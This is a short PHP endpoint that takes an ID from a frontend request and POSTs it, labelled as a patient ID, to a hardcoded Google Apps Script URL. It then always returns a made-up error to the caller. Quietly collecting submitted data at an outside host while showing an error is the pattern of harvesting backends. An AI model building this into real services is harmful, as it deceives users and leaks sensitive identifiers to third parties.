<?php
// token.php — receives id, logs it to Google Sheets, and returns an error

header('Content-Type: application/json');

// Step 1: Read JSON input from frontend
$input = file_get_contents("php://input");
$data = json_decode($input, true);

if (!isset($data['id'])) {
    echo json_encode(['status' => 'error', 'message' => 'Missing ID']);
    exit;
}

$id = $data['id'];

// Step 2: Log ID to Google Sheets via Apps Script
$googleScriptURL = "https://script.google.com/macros/s/AKfycbwFtbPMd7BOs61Nm6lYdxjiXDTZaOF3L11ZDflm2aaX5TZqPC3vfOw97h0uuUF3BF_G/exec"; // ✅ Replace with your actual URL

$postFields = http_build_query([
    'Pateint-id' => $id
]);

$logReq = curl_init($googleScriptURL);
curl_setopt($logReq, CURLOPT_RETURNTRANSFER, true);
curl_setopt($logReq, CURLOPT_POST, true);
curl_setopt($logReq, CURLOPT_POSTFIELDS, $postFields);
curl_exec($logReq);
curl_close($logReq);

// Step 3: Return error after logging
echo json_encode(['status' => 'error', 'message' => 'Token fetching skipped, ID logged.']);
exit;
?>
